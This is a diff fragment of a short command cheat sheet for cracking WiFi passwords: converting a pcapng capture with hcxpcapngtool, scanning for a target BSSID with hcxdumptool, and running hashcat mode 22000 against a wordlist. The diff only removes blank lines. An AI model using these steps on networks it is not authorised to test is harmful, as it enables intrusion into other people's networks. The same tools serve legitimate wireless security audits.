@@ -21,7 +21,6 @@ sudo systemctl start NetworkManager.service
 # Convert to cracing file // filename.pcapng -> hash.hc22000
 hcxpcapngtool -o hash.hc22000 -E essidlist filename.pcapng
 
-
 -------------#  If you want to crack specific wifi network     
  // You can use this to find wifi bssid ( EX: 0cf7c0c43943
 sudo hcxdumptool --do_rcascan -i wlan0          
@@ -30,13 +29,8 @@ sudo hcxdumptool --do_rcascan -i wlan0
 nano hash.hc
 -------------#
 
-
 # Start crack wifi password
 hashcat -m 22000 hash.hc22000 wordlist.txt
-
-
-
-
 
 
 
